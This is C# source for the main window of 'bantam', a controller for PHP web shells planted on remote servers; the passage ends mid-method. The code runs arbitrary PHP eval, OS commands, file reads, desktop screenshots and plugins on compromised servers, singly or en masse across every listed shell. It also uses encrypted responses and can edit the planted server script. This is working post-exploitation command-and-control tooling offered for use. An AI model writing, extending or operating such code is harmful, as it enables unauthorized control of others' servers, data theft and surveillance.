using System;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Web.UI.WebControls;
using System.Windows.Forms;

using bantam.Classes;
using bantam.Forms;

namespace bantam
{
    public partial class BantamMain : Form
    {
        /// <summary>
        /// Static instance accessor to our dynamic instance, todo look into making BantamMain static
        /// </summary>
        public static BantamMain Instance {
            get; private set;
        }

        /// <summary>
        /// Full path and name of xml file if a file has opened (used for saving)
        /// </summary>
        private static string OpenFileName;

        /// <summary>
        /// Full url of the Shell we have selected in the main listview
        /// </summary>
        private static string SelectedShellUrl;

        /// <summary>
        /// Available Shells in the listview
        /// </summary>
        public static ConcurrentDictionary<String, ShellInfo> Shells = new ConcurrentDictionary<String, ShellInfo>();

        /// <summary>
        /// Console Textbox's Autocomplete collection
        /// </summary>
        private static readonly AutoCompleteStringCollection consoleTextboxAutoComplete = new AutoCompleteStringCollection();

        /// <summary>
        /// Custom TextBox Control with button on left side to act as a back button
        /// </summary>
        private readonly TextBoxButton txtBoxFileBrowserPath = new TextBoxButton();

        /// <summary>
        /// Default constructor
        /// </summary>
        public BantamMain()
        {
            //Store instance ref accessable statically
            Instance = this;

            //Default UI Component Initialization
            InitializeComponent();

            //todo abstract
            //has to be initialized with parameters manually because, constructor with params breaks design mode...
            txtBoxFileBrowserPath.Initialize(6, 511, 522, 23, "txtBoxFileBrowserPath", this.txtBoxFileBrowserPath_KeyDown, btnFileBrowserBack_MouseClick, 21);

            //manually add the custom control to the tab page
            this.tabPageFiles.Controls.Add(this.txtBoxFileBrowserPath);

            //setup custom sorter for filebrowser
            treeViewFileBrowser.TreeViewNodeSorter = new FileBrowserTreeNodeSorter();

            //setup console input's auto complete source
            textBoxConsoleInput.AutoCompleteCustomSource = consoleTextboxAutoComplete;

            //Loads the mandatory settings file
            XmlHelper.LoadSettings(AppDomain.CurrentDomain.BaseDirectory + "/settings.xml");
        }

        #region HELPER_FUNCTIONS

        /// <summary>
        /// Overloaded ValidTarget checks to see if you have a current target selected and if they are valid to send commands to
        /// </summary>
        /// <returns></returns>
        public static bool ValidTarget()
        {
            return ValidTarget(SelectedShellUrl);
        }

        /// <summary>
        /// ValidTarget checks to see the specified target is valid and if they are valid to send commands to, 
        /// default behaviour is to use the currently selected target
        /// </summary>
        /// <returns></returns>
        public static bool ValidTarget(string shellUrl)
        {
            string targetUrl = shellUrl;
            if (string.IsNullOrEmpty(targetUrl)) {
                targetUrl = SelectedShellUrl;
            }

            if (string.IsNullOrEmpty(targetUrl) == false
             && Shells.ContainsKey(targetUrl)
             && Shells[targetUrl].Down == false) {
                return true;
            }
            return false;
        }


        /// <summary>
        /// A thread safe function for adding logs to the logs tab's richtextbox control
        /// </summary>
        /// <param name="log"></param>
        public delegate void AppendToRichTextBoxLogsDelegate(string log);
        public void AppendToRichTextBoxLogs(string log)
        {
            if (this.InvokeRequired) {
                this.Invoke(new AppendToRichTextBoxLogsDelegate(AppendToRichTextBoxLogs), new object[] { log });
                return;
            }
            richTextBoxLogs.Text += log;
        }

        /// <summary>
        /// Adds a shell to the listview
        /// </summary>
        /// <param name="shellUrl"></param>
        /// <param name="pingMS"></param>
        public void AddShellToListView(string shellUrl, string pingMS)
        {
            ListViewItem lvi = new ListViewItem(new[] { shellUrl, pingMS + " ms" }) {
                Font = new System.Drawing.Font("Microsoft Tai Le", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, (byte)0)
            };
            listViewShells.Items.Add(lvi);
        }

        /// <summary>
        /// Adds a shell that is Down to the listview with RED background color
        /// </summary>
        /// <param name="shellUrl"></param>
        public void AddDownShellToListView(string shellUrl)
        {
            ListViewItem lvi = new ListViewItem(new[] { shellUrl, "-" + " ms" }) {
                Font = new System.Drawing.Font("Microsoft Tai Le", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, (byte)0),
                BackColor = System.Drawing.Color.Red
            };

            listViewShells.Items.Add(lvi);
            Shells[shellUrl].Down = true;
        }

        /// <summary>
        /// Removes a shell from listviewShells with the given "shellURL"
        /// </summary>
        /// <param name="shellURL"></param>
        public void GuiCallbackRemoveShellURL(string shellURL)
        {
            ListViewItem selectedLvi = listViewShells.FindItemWithText(shellURL);
            if (selectedLvi != null) {
                listViewShells.FindItemWithText(shellURL).Remove();
            }
        }

        /// <summary>
        /// A Wrapper for executing php code and displaying the result into a richtextbox
        /// </summary>
        /// <param name="url"></param>
        /// <param name="phpCode"></param>
        /// <param name="title"></param>
        /// <param name="encryptResponse"></param>
        /// <param name="ResponseEncryptionMode"></param>
        /// <param name="richTextBox"></param>
        /// <param name="prependText"></param>
        public static async Task ExecutePHPCodeDisplayInRichTextBox(string url, string phpCode, string title, bool encryptResponse, int ResponseEncryptionMode, bool base64DecodeResponse = false, RichTextBox richTextBox = null, string prependText = "")
        {
            String result = await ExecutePHPCode(url, phpCode, encryptResponse, ResponseEncryptionMode);

            if (string.IsNullOrEmpty(result)) {
                result = "No readable data returned from server.";
            }

            if (base64DecodeResponse) {
                result = Helper.DecodeBase64ToString(result);
            }

            result = result.Replace(PhpBuilder.responseDataRowSeperator, "\r\n");

            if (!string.IsNullOrEmpty(prependText)) {
                result = prependText + result + "\r\n";
            }

            if (richTextBox != null && richTextBox.IsDisposed == false) {
                richTextBox.Text += result;
            } else {
                GuiHelper.RichTextBoxDialog(title, result);
            }
        }

        /// <summary>
        /// Shell initialization routine. Connects with the shell, obtains default information for UI and backend, add's to listview if succeeds.
        /// </summary>
        /// <param name="shellUrl">The Url of the Shell you are connecting too</param>
        public async Task InitializeShellData(string shellUrl)
        {
            if (string.IsNullOrEmpty(shellUrl) == false) {
                bool encryptResponse = Shells[shellUrl].ResponseEncryption;
                int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

                Stopwatch pingWatch = new Stopwatch();
                pingWatch.Start();

                if (!Helper.IsValidUri(shellUrl)) {
                    AddDownShellToListView(shellUrl);
                    return;
                }

                var task = WebRequestHelper.ExecuteRemotePHP(shellUrl, PhpBuilder.InitShellData(encryptResponse));

                if (await Task.WhenAny(task, Task.Delay(Config.TimeoutMS)) == task) {
                    ResponseObject response = task.Result;

                    if (string.IsNullOrEmpty(response.Result) == false) {
                        string result = response.Result;
                        if (encryptResponse) {
                            result = CryptoHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, ResponseEncryptionMode);
                        }

                        string[] data = result.Split(new[] { PhpBuilder.responseDataSeperator }, StringSplitOptions.None);

                        var initDataReturnedVarCount = Enum.GetValues(typeof(ShellInfo.INIT_DATA_VARS)).Cast<ShellInfo.INIT_DATA_VARS>().Max();

                        if (data != null && data.Length == (int)initDataReturnedVarCount + 1) {
                            AddShellToListView(shellUrl, pingWatch.ElapsedMilliseconds.ToString());

                            Shells[shellUrl].InitializeShellData(pingWatch.ElapsedMilliseconds, data);
                            Shells[shellUrl].Down = false;
                        } else {
                            AddDownShellToListView(shellUrl);
                        }
                    } else {
                        AddDownShellToListView(shellUrl);
                    }
                    pingWatch.Stop();
                } else {
                    AddDownShellToListView(shellUrl);
                }
            }
        }

        /// <summary>
        /// Main wrapper / handler for executing php code on a given shellUrl
        /// </summary>
        /// <param name="shellUrl"></param>
        /// <param name="phpCode"></param>
        /// <param name="encryptResponse"></param>
        /// <param name="ResponseEncryptionMode"></param>
        /// <returns></returns>
        private async static Task<string> ExecutePHPCode(string shellUrl, string phpCode, bool encryptResponse, int ResponseEncryptionMode)
        {
            string result = string.Empty;
            var task = WebRequestHelper.ExecuteRemotePHP(shellUrl, phpCode);

            if (await Task.WhenAny(task, Task.Delay(Config.TimeoutMS)) == task) {
                ResponseObject response = task.Result;
                if (string.IsNullOrEmpty(response.Result)) {
                    LogHelper.AddShellLog(shellUrl, "Empty response from code ( " + phpCode + " )", LogHelper.LOG_LEVEL.INFO);
                    return string.Empty;
                }

                result = response.Result;

                if (encryptResponse) {
                    result = CryptoHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, ResponseEncryptionMode);
                }

                if (string.IsNullOrEmpty(result)) {
                    LogHelper.AddShellLog(shellUrl, "Empty response decrypted from code ( " + phpCode + " )", LogHelper.LOG_LEVEL.INFO);
                    return string.Empty;
                }
            } else {
                LogHelper.AddShellLog(shellUrl, "Empty response decrypted from code ( " + phpCode + " )", LogHelper.LOG_LEVEL.INFO);
                return string.Empty;
            }

            return result;
        }

        #endregion

        #region GUI_EVENTS

        /// <summary>
        /// Creates Useragent switcher Form and allows for changing of useragent
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void userAgentSwitcherToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string userAgent = "User Agent: " + Config.DefaultUserAgent;
            string newUserAgent = GuiHelper.UserAgentSwitcher(userAgent, "Change User Agent");

            if (!string.IsNullOrEmpty(newUserAgent)) {
                Config.DefaultUserAgent = newUserAgent;
            }
        }

        /// <summary>
        /// Eval execution editor and execution routine
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void evalToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ValidTarget() == false) {
                return;
            }

            bool showResponse = true;
            string shellUrl = SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

            string code = GuiHelper.RichTextBoxEvalEditor("PHP Eval Editor - " + shellUrl, string.Empty, ref showResponse);

            if (string.IsNullOrEmpty(code) == false) {
                if (encryptResponse) {
                    code = PhpBuilder.phpOb_Start + code + PhpBuilder.phpOb_End;
                }

                if (showResponse) {
                    ExecutePHPCodeDisplayInRichTextBox(shellUrl, code, "PHP Eval Result - " + shellUrl, encryptResponse, ResponseEncryptionMode);
                } else {
                    await WebRequestHelper.ExecuteRemotePHP(shellUrl, code);
                }
            } else {
                LogHelper.AddShellLog(shellUrl, "Attempted to eval empty code.", LogHelper.LOG_LEVEL.INFO);
            }
        }

        /// <summary>
        /// Eval execution wrapper for handling mass eval executions
        /// </summary>
        /// <param name="shellUrl"></param>
        /// <param name="code"></param>
        /// <param name="encryptResponse"></param>
        /// <param name="ResponseEncryptionMode"></param>
        /// <param name="rtb"></param>
        private async Task ExecuteMassEval(string shellUrl, string code, bool encryptResponse, int ResponseEncryptionMode, bool showResponse, RichTextBox rtb)
        {
            string result = await ExecutePHPCode(shellUrl, code, encryptResponse, ResponseEncryptionMode);

            if (string.IsNullOrEmpty(result) == false) {
                if (!showResponse) {
                    return;
                }

                if (rtb != null && rtb.IsDisposed == false) {
                    rtb.Text += "Result from (" + shellUrl + ") \r\n" + result + "\r\n\r\n";
                }
            } else {
                rtb.Text += "No result from (" + shellUrl + ") \r\n\r\n";
            }
        }

        /// <summary>
        /// Mass eval routine handler and loop
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void evalToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (listViewShells.Items.Count <= 0) {
                return;
            }

            bool showResponse = false;

            string code = GuiHelper.RichTextBoxEvalEditor("PHP Eval Editor - Mass Eval", string.Empty, ref showResponse);

            if (string.IsNullOrEmpty(code)) {
                return;
            }

            RichTextBox rtb = GuiHelper.RichTextBoxDialog("Mass Eval", string.Empty);

            foreach (ListViewItem lvClients in listViewShells.Items) {
                string shellUrl = lvClients.Text;
                if (Shells.ContainsKey(shellUrl)) {
                    bool encryptResponse = Shells[shellUrl].ResponseEncryption;
                    int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

                    string finalCode = code;
                    if (encryptResponse) {
                        finalCode = PhpBuilder.phpOb_Start + code + PhpBuilder.phpOb_End;
                    }
                    ExecuteMassEval(shellUrl, finalCode, encryptResponse, ResponseEncryptionMode, showResponse, rtb);
                }
            }
        }

        /// <summary>
        /// Edits the PHP code of BANTAM that is stored online ! @dangerous could lose access to your shell
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void editPHPCodeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

            //windows does not currently support uploading
            if (Shells[shellUrl].IsWindows) {
                return;
            }

            string phpCode = PhpBuilder.ReadFileFromVarToBase64(PhpBuilder.phpServerScriptFileName, encryptResponse);
            string result = await ExecutePHPCode(shellUrl, phpCode, encryptResponse, ResponseEncryptionMode);

            if (!string.IsNullOrEmpty(result)) {
                result = Helper.DecodeBase64ToString(result);
            }

            UploadFile u = new UploadFile(shellUrl, result, true);
            u.ShowDialog();
        }

        /// <summary>
        /// Display PHPinfo in Web browser control
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void phpinfoToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ValidTarget() == false) {
                return;
            }

            string shellUrl = SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

            string result = await ExecutePHPCode(shellUrl, PhpBuilder.PhpInfo(encryptResponse), encryptResponse, ResponseEncryptionMode);

            if (string.IsNullOrEmpty(result) == false) {
                BrowserView broView = new BrowserView(result, 1000, 1000);
                broView.Show();
            }
        }

        /// <summary>
        /// Main Clients/Shells listview selected index changed event
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void listviewClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            ListViewItem lvi = GuiHelper.GetFirstSelectedListview(listViewShells);

            if (lvi != null) {
                treeViewFileBrowser.BeginUpdate();
                if (!string.IsNullOrEmpty(SelectedShellUrl) && Shells.ContainsKey(SelectedShellUrl)) {

                    if (treeViewFileBrowser.Nodes != null && treeViewFileBrowser.Nodes.Count > 0) {
                        if (Shells[SelectedShellUrl].Files != null
                         && Shells[SelectedShellUrl].Files.Nodes != null
                         && Shells[SelectedShellUrl].Files.Nodes.Count > 0) {
                            Shells[SelectedShellUrl].Files.Nodes.Clear();
                        }

                        GuiHelper.CopyNodesFromTreeView(treeViewFileBrowser, Shells[SelectedShellUrl].Files);
                        treeViewFileBrowser.Nodes.Clear();
                    }

                    if (!string.IsNullOrEmpty(txtBoxFileBrowserPath.Text)) {
                        Shells[SelectedShellUrl].Pwd = txtBoxFileBrowserPath.Text;
                    }

                    if (!string.IsNullOrEmpty(richTextBoxConsoleOutput.Text)) {
                        Shells[SelectedShellUrl].ConsoleText = richTextBoxConsoleOutput.Text;
                    }

                    if (!string.IsNullOrEmpty(richTextBoxLogs.Text)) {
                        Shells[SelectedShellUrl].LogText = richTextBoxLogs.Text;
                    }
                }

                SelectedShellUrl = lvi.SubItems[0].Text;

                if (!string.IsNullOrEmpty(Shells[SelectedShellUrl].ConsoleText)) {
                    richTextBoxConsoleOutput.Text = Shells[SelectedShellUrl].ConsoleText;
                } else {
                    richTextBoxConsoleOutput.Text = string.Empty;
                }

                if (!string.IsNullOrEmpty(Shells[SelectedShellUrl].LogText)) {
                    richTextBoxLogs.Text = Shells[SelectedShellUrl].LogText;
                } else {
                    richTextBoxLogs.Text = string.Empty;
                }

                if (Shells[SelectedShellUrl].IsWindows) {
                    btnUpload.Enabled = false;
                    btnFileBrowserGo.Enabled = false;
                    txtBoxFileBrowserPath.Enabled = false;
                    contextMenuStripFileBrowser.Enabled = false;
                } else {
                    btnUpload.Enabled = true;
                    btnFileBrowserGo.Enabled = true;
                    txtBoxFileBrowserPath.Enabled = true;
                    contextMenuStripFileBrowser.Enabled = true;
                }

                foreach (ListViewItem lvClients in listViewShells.Items) {
                    if (lvClients.BackColor != System.Drawing.Color.Red) {
                        lvClients.BackColor = System.Drawing.SystemColors.Window;
                        lvClients.ForeColor = System.Drawing.SystemColors.WindowText;
                    }
                }

                if (lvi.BackColor != System.Drawing.Color.Red) {
                    lvi.BackColor = System.Drawing.SystemColors.Highlight;
                    lvi.ForeColor = System.Drawing.SystemColors.HighlightText;
                }

                if (ValidTarget() == false) {
                    textBoxCWD.Text = string.Empty;
                    textBoxFreeSpace.Text = string.Empty;
                    textBoxHDDSpace.Text = string.Empty;
                    textBoxServerIP.Text = string.Empty;
                    textBoxUname.Text = string.Empty;
                    textBoxUser.Text = string.Empty;
                    textBoxWebServer.Text = string.Empty;
                    textBoxGroup.Text = string.Empty;
                    textBoxPHP.Text = string.Empty;
                    txtBoxFileBrowserPath.Text = string.Empty;
                    return;
                } else {
                    textBoxCWD.Text = Shells[SelectedShellUrl].Cwd;
                    textBoxFreeSpace.Text = string.IsNullOrEmpty(Shells[SelectedShellUrl].FreeHDDSpace) ? "0"
                                         : Helper.FormatBytes(Convert.ToDouble(Shells[SelectedShellUrl].FreeHDDSpace));

                    textBoxHDDSpace.Text = string.IsNullOrEmpty(Shells[SelectedShellUrl].TotalHDDSpace) ? "0"
                                        : Helper.FormatBytes(Convert.ToDouble(Shells[SelectedShellUrl].TotalHDDSpace));

                    textBoxServerIP.Text = Shells[SelectedShellUrl].Ip;
                    textBoxUname.Text = Shells[SelectedShellUrl].UnameRelease + " " + Shells[SelectedShellUrl].UnameKernel;
                    textBoxUser.Text = Shells[SelectedShellUrl].Uid + " ( " + Shells[SelectedShellUrl].User + " )";
                    textBoxWebServer.Text = Shells[SelectedShellUrl].ServerSoftware;
                    textBoxGroup.Text = Shells[SelectedShellUrl].Gid + " ( " + Shells[SelectedShellUrl].Group + " )";
                    textBoxPHP.Text = Shells[SelectedShellUrl].PHP_VERSION;
                }

                if (tabControlMain.SelectedTab == tabPageFiles) {
                    if (Shells[SelectedShellUrl].Files.Nodes != null
                     && Shells[SelectedShellUrl].Files.Nodes.Count > 0) {
                        GuiHelper.CopyNodesFromTreeView(Shells[SelectedShellUrl].Files, treeViewFileBrowser);

                        treeViewFileBrowser.ExpandAll();
                        treeViewFileBrowser.Sort();
                        treeViewFileBrowser.Refresh();

                        txtBoxFileBrowserPath.Text = Shells[SelectedShellUrl].Pwd;
                    } else {
                        StartFileBrowser();
                    }
                }
                treeViewFileBrowser.EndUpdate();
            } else {

            }
        }

        /// <summary>
        /// Creates a screenshot of a Windows server desktop and displays the result in a browser viewer
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void desktopScreenshotToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ValidTarget() == false) {
                return;
            }

            string shellUrl = SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

            string result = await ExecutePHPCode(shellUrl, PhpBuilder.WindowsDesktopScreenShot(), encryptResponse, ResponseEncryptionMode);

            if (string.IsNullOrEmpty(result) == false) {
                BrowserView broView = new BrowserView(result, 1000, 1000);
                broView.Show();
            }
        }

        /// <summary>
        /// Tab Control Selected Index Changed event handler, for saving gui states and settings etc
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void tabControl1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (ValidTarget() == false) {
                return;
            }

            string shellUrl = SelectedShellUrl;
            if (tabControlMain.SelectedTab == tabPageFiles) {
                //if the gui's treeview is empty and the cached treeview data is not empty
                if (treeViewFileBrowser.Nodes != null
                && treeViewFileBrowser.Nodes.Count == 0
                && Shells[shellUrl].Files.Nodes != null
                && Shells[shellUrl].Files.Nodes.Count > 0) {
                    //populate the treeview from cache
                    GuiHelper.CopyNodesFromTreeView(Shells[shellUrl].Files, treeViewFileBrowser);
                    treeViewFileBrowser.Refresh();
                    treeViewFileBrowser.ExpandAll();

                    txtBoxFileBrowserPath.Text = Shells[shellUrl].Pwd;
                } else {
                    //if the gui treeview is empty, start the filebrowser and display it
                    if (treeViewFileBrowser.Nodes.Count == 0) {
                        StartFileBrowser();
                    }
                }
            }
        }

        /// <summary>
        /// Creates a new OS command into the GUI/toolstrip menu
        /// </summary>
        /// <param name="command"></param>
        /// <param name="text"></param>
        /// <param name="is_windows"></param>
        public void AddOsCommandOptionToGUIFromXML(string command, string text, bool is_windows)
        {
            ToolStripItem toolStripItem;

            if (is_windows) {
                toolStripItem = this.windowsToolStripMenuItem.DropDownItems.Add(text);
            } else {
                toolStripItem = this.linuxToolStripMenuItem.DropDownItems.Add(text);
            }

            toolStripItem.Tag = command;
            toolStripItem.Click += new EventHandler(this.OsCommandClickHandler);
        }

        /// <summary>
        /// Handles the click events for the dynamically created OSCommand functions, builds and runs code, displays result
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OsCommandClickHandler(object sender, EventArgs e)
        {
            //Obtain the command sent through the "tag" property of the Item
            ToolStripItem item = (ToolStripItem)sender;

            if (item == null || item.Tag == null) {
                return;
            }

            string command = (string)item.Tag;

            string shellUrl = SelectedShellUrl;
            bool encrypt = Shells[shellUrl].ResponseEncryption;
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;
            string phpCode = PhpBuilder.ExecuteSystemCode(command, encrypt);

            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, command, encrypt, ResponseEncryptionMode);
        }

        /// <summary>
        /// Creates a readfile command into the GUI/toolstrip menu
        /// </summary>
        /// <param name="file"></param>
        /// <param name="text"></param>
        /// <param name="is_windows"></param>
        public void AddReadFileOptionToGUIFromXML(string file, string text, bool is_windows)
        {
            ToolStripItem toolStripItem;

            if (is_windows) {
                toolStripItem = this.windowsToolStripMenuItem.DropDownItems.Add(text);
            } else {
                toolStripItem = this.linuxToolStripMenuItem.DropDownItems.Add(text);
            }

            //Filename to read is passed through the elements "tag" property
            toolStripItem.Tag = file;
            toolStripItem.Click += new EventHandler(this.ReadFileOptionClickHandler);
        }

        /// <summary>
        /// Handles the click events for the dynamically created read file functions, builds code, reads file, displays result
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ReadFileOptionClickHandler(object sender, EventArgs e)
        {
            //Obtain the filename sent through the "tag" property of the Item
            ToolStripItem item = (ToolStripItem)sender;

            if (item == null || item.Tag == null) {
                return;
            }

            string file = (string)item.Tag;

            string shellUrl = SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;
            string phpCode = PhpBuilder.ReadFileToBase64(file, encryptResponse);

            ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, file, encryptResponse, ResponseEncryptionMode, true);
        }

        /// <summary>
        /// Adds single execution plugin into the GUI/toolstrip
        /// </summary>
        /// <param name="name"></param>
        /// <param name="showResult"></param>
        public void AddSingleExecPluginOptionToGUIFromXML(string name, bool showResult)
        {
            ToolStripItem toolStripItem = this.pluginsToolStripMenuItem.DropDownItems.Add(name);
            ;

            toolStripItem.Tag = showResult;
            toolStripItem.Click += new EventHandler(this.SingleExecPluginOptionClickHandler);
        }

        /// <summary>
        /// Handles the click events for the dynamically created single execution plugins, executes the plugin code
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void SingleExecPluginOptionClickHandler(object sender, EventArgs e)
        {
            if (ValidTarget() == false) {
                return;
            }

            string shellUrl = SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

            ToolStripItem item = (ToolStripItem)sender;

            if (item == null || item.Tag == null) {
                return;
            }

            bool showResponse = (bool)item.Tag;
            string code = File.ReadAllText("plugins/" + item.Text + ".php");

            if (String.IsNullOrEmpty(code) == false) {
                if (encryptResponse) {
                    code = PhpBuilder.phpOb_Start + code + PhpBuilder.phpOb_End;
                }

                if (showResponse) {
                    ExecutePHPCodeDisplayInRichTextBox(shellUrl, code, "PHP Plugin Result - " + shellUrl, encryptResponse, ResponseEncryptionMode);
                } else {
                    await WebRequestHelper.ExecuteRemotePHP(shellUrl, code);
                }
            }
        }

        /// <summary>
        /// Adds Mass execution plugin into the GUI/Toolstrip
        /// </summary>
        /// <param name="name"></param>
        /// <param name="showResult"></param>
        public void AddMassExecPluginOptionToGUIFromXML(string name, bool showResult)
        {
            ToolStripItem toolStripItem = this.pluginsToolStripMenuItemMain.DropDownItems.Add(name);
            ;

            toolStripItem.Tag = showResult;
            toolStripItem.Click += new EventHandler(this.MassExecPluginOptionClickHandler);
        }

        /// <summary>
        /// Handles the click events for the dynamically created mass execution plugins, executes the plugin code
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void MassExecPluginOptionClickHandler(object sender, EventArgs e)
        {
            if (listViewShells.Items.Count <= 0) {
                return;
            }

            ToolStripItem item = (ToolStripItem)sender;

            if (item == null || item.Tag == null) {
                return;
            }

            bool showResponse = (bool)item.Tag;
            RichTextBox rtb = GuiHelper.RichTextBoxDialog("Plugin Result", string.Empty);

            foreach (ListViewItem lvClients in listViewShells.Items) {
                string shellUrl = lvClients.Text;

                if (Shells.ContainsKey(shellUrl)) {
                    bool encryptResponse = Shells[shellUrl].ResponseEncryption;
                    int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

                    string finalCode = File.ReadAllText("plugins/" + item.Text + ".php");

                    if (String.IsNullOrEmpty(finalCode) == false) {
                        if (encryptResponse) {
                            finalCode = PhpBuilder.phpOb_Start + finalCode + PhpBuilder.phpOb_End;
                        }
                        ExecuteMassEval(shellUrl, finalCode, encryptResponse, ResponseEncryptionMode, showResponse, rtb);
                    } else {
                        LogHelper.AddGlobalLog("Failed to find plugin file", "Plugin Load Failure", LogHelper.LOG_LEVEL.ERROR);
                    }
                }
            }
        }

        /// <summary>
        /// Saves shell list and settings to current opened XML file
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void saveClientsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            XmlHelper.SaveShells(OpenFileName);
        }

        /// <summary>
        /// Listview Clients Paint event hook, to disable / enable features dynamically. I.E - Window/Linux
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void listviewClientsContextMenu_Paint(object sender, PaintEventArgs e)
        {
            if (ValidTarget()) {
                phpToolStripMenuItem.Visible = true;
                systemToolstripMenuItem.Visible = true;

                if (Shells[SelectedShellUrl].IsWindows) {
                    linuxToolStripMenuItem.Visible = false;
                    windowsToolStripMenuItem.Visible = true;
                } else {
                    linuxToolStripMenuItem.Visible = true;
                    windowsToolStripMenuItem.Visible = false;
                }
            } else {
                phpToolStripMenuItem.Visible = false;
                systemToolstripMenuItem.Visible = false;
            }
        }

        /// <summary>
        /// Removes a shell/client from the listview
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void removeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(SelectedShellUrl) == false) {
                listViewShells.SelectedItems[0].Remove();
                if (Shells.ContainsKey(SelectedShellUrl)) {
                    if (!Shells.TryRemove(SelectedShellUrl, out ShellInfo outShellInfo)) {
                        LogHelper.AddShellLog(SelectedShellUrl, "Attempted to remove shell and operation failed.", LogHelper.LOG_LEVEL.WARNING);
                    }
                }
            }
        }

        /// <summary>
        /// Removes the client, re-adds it and tests the connection
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void testConnectionStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(SelectedShellUrl)
             || Shells.ContainsKey(SelectedShellUrl) == false) {
                return;
            }

            string shellURL = SelectedShellUrl;
            ShellInfo shellInfo = Shells[shellURL];

            listViewShells.FindItemWithText(shellURL).Remove();

            Shells.TryRemove(shellURL, out ShellInfo shellInfoRemove);
            Shells.TryAdd(shellURL, shellInfo);

            InitializeShellData(shellURL);
        }

        /// <summary>
        /// Saves the current shell/client list to an XML file specified in the savefile dialog
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void saveShellsAsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SaveFileDialog saveShellsXMLDialog = new SaveFileDialog {
                Filter = "All files (*.*)|*.*|xml files (*.xml)|*.xml",
                FilterIndex = 2,
                RestoreDirectory = true
            };

            if (saveShellsXMLDialog.ShowDialog() == DialogResult.OK) {
                XmlHelper.SaveShells(saveShellsXMLDialog.FileName);
            }
        }

        /// <summary>
        /// Opens the current shell/clients from the specified XML list
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void openShellXmlFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var openShellXMLDialog = new OpenFileDialog {
                Filter = "All files (*.*)|*.*|xml files (*.xml)|*.xml",
                FilterIndex = 2,
                RestoreDirectory = true
            }) {
                if (openShellXMLDialog.ShowDialog() == DialogResult.OK) {
                    foreach (ListViewItem lvClients in listViewShells.Items) {
                        if (Shells.ContainsKey(lvClients.Text)) {
                            Shells.TryRemove(lvClients.Text, out ShellInfo outShellInfo);
                        }
                        lvClients.Remove();
                    }
                    XmlHelper.LoadShells(openShellXMLDialog.FileName);

                    OpenFileName = openShellXMLDialog.FileName;
                    saveClientsToolStripMenuItem.Enabled = true;
                }
            }
        }

        /// <summary>
        /// Console Input Keydown handler for intercepting enterkeypress and triggering the event
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void textBoxConsoleInput_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter) {
                btnConsoleGoClick_Click(sender, e);
                e.Handled = true;
                e.SuppressKeyPress = true;
            }
        }

        /// <summary>
        /// Filebrowser Input Keydown handler for intercepting enterkeypress and triggering the event
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void txtBoxFileBrowserPath_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter) {
